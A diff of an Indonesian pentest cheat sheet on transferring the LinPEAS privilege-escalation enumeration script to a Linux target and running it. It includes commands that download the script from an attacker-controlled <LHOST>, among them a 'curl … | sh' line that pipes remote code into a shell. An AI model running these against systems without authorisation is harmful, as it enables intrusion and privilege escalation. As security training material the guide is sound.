@@ -1,16 +1,16 @@
-# 🐧 LinPEAS — Otomatisasi Enumerasi Privilege Escalation Linux
+﻿# LinPEAS — Otomatisasi Enumerasi Privilege Escalation Linux
 
 > **Tujuan:** Menjalankan skrip **LinPEAS** untuk memperoleh detail sistem yang membantu menemukan vektor privilege escalation pada Linux.
 
 ---
 
-## 📌 Penjelasan Singkat
+## Penjelasan Singkat
 
 LinPEAS (bagian dari **PEASS-ng**) adalah script **enumerasi otomatis** yang mengumpulkan informasi penting: SUID/SGID binaries, sudo permissions, cron jobs, writable files, capabilities, credentials, dan lainnya.
 
 ---
 
-## 📦 Sumber & Instalasi
+## Sumber & Instalasi
 
 - **GitHub:** <https://github.com/peass-ng/PEASS-ng>
 - **Kali Linux:** `/usr/share/peass/linpeas/linpeas.sh`
@@ -18,9 +18,9 @@ LinPEAS (bagian dari **PEASS-ng**) adalah script **enumerasi otomatis** yang men
 
 ---
 
-## 📥 Transfer ke Target
+## Transfer ke Target
 
-### 1️⃣ Jalankan HTTP Server di Kali
+### 1 Jalankan HTTP Server di Kali
 
 ```bash
 python3 -m http.server 8089
@@ -28,7 +28,7 @@ python3 -m http.server 8089
 
 File `linpeas.sh` harus berada di direktori yang di‑share.
 
-### 2️⃣ Unduh dari Target
+### 2 Unduh dari Target
 
 ```bash
 wget http://<LHOST>:8089/linpeas.sh -O /tmp/linpeas.sh
@@ -36,7 +36,7 @@ wget http://<LHOST>:8089/linpeas.sh -O /tmp/linpeas.sh
 curl http://<LHOST>:8089/linpeas.sh -o /tmp/linpeas.sh
 ```
 
-## ▶️ Eksekusi LinPEAS
+## ▶ Eksekusi LinPEAS
 
 ```bash
 chmod +x /tmp/linpeas.sh
@@ -51,7 +51,7 @@ curl http://<LHOST>:8089/linpeas.sh | sh
 
 ---
 
-## 📊 Membaca Hasil
+## Membaca Hasil
 
 LinPEAS menandai temuan dengan warna:
 
@@ -73,7 +73,7 @@ Capabilities → CAP_NET_ADMIN on /usr/bin/ping
 
 ---
 
-## 📋 Checklist LinPEAS
+## Checklist LinPEAS
 
 - [ ] Transfer `linpeas.sh` ke target (HTTP, wget, curl, SCP).
 - [ ] Set executable (`chmod +x`).
@@ -84,7 +84,7 @@ Capabilities → CAP_NET_ADMIN on /usr/bin/ping
 
 ---
 
-## 📚 Referensi
+## Referensi
 
 - [PEASS-ng – LinPEAS Documentation](https://github.com/peass-ng/PEASS-ng)
 - [Kali Linux – LinPEAS Location](https://www.kali.org/tools/linpeas/)
